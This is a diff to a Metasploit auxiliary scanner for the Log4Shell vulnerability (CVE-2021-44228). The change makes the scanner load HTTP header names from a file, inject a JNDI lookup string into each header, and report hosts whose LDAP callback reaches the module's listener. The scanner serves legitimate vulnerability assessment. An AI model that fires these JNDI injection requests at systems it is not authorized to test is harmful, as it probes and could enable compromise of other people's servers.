@@ -20,7 +20,11 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      OptString.new('TARGETURI', [ true, 'The URI to scan', '/'])
+      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
+      OptPath.new('HEADERS_FILE', [
+        true, 'File containing headers to check',
+        File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')
+      ]),
     ])
   end
 
@@ -29,7 +33,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_client_connect(client)
-    print_good('Received client connection!')
     client.extend(Net::BER::BERParser)
     Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
 
@@ -37,9 +40,19 @@ class MetasploitModule < Msf::Auxiliary
     pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
     token = pdu.search_parameters[:base_object].to_s
 
-    if @tokens[token]
-      print_good('Vulnerability found!')
+    unless (context = @tokens[token]).nil?
+      details = "#{context[:method]} #{normalize_uri(context[:target_uri])} (header: #{context[:header]})"
+      print_good('Log4Shell found via ' + details)
+      report_vuln(
+        host: context[:rhost],
+        port: context[:rport],
+        info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
+        name: name,
+        refs: references
+      )
     end
+  ensure
+    client.close
   end
 
   def rand_text_alpha_lower_numeric(len, bad = '')
@@ -65,13 +78,26 @@ class MetasploitModule < Msf::Auxiliary
 
   # Fingerprint a single host
   def run_host(_ip)
-    token = rand_text_alpha_lower_numeric(8..32)
-    @tokens[token] = {
-      rhost: rhost,
-      target_uri: target_uri,
-      method: 'GET'
-    }
-    send_request_raw({ 'uri' => normalize_uri(target_uri), 'method' => 'GET', 'headers' => { 'If-Modified-Since' => jndi_string(token) } }, 3)
+    method = 'GET'
+    headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
+    headers_file.lines.each do |header|
+      header.strip!
+      next if header.start_with?('#')
+
+      token = rand_text_alpha_lower_numeric(8..32)
+      @tokens[token] = {
+        rhost: rhost,
+        rport: rport,
+        target_uri: normalize_uri(target_uri),
+        method: method,
+        header: header
+      }
+      send_request_raw({
+        'uri' => normalize_uri(target_uri),
+        'method' => method,
+        'headers' => { header => jndi_string(token) }
+      })
+    end
   end
 
   attr_accessor :tokens
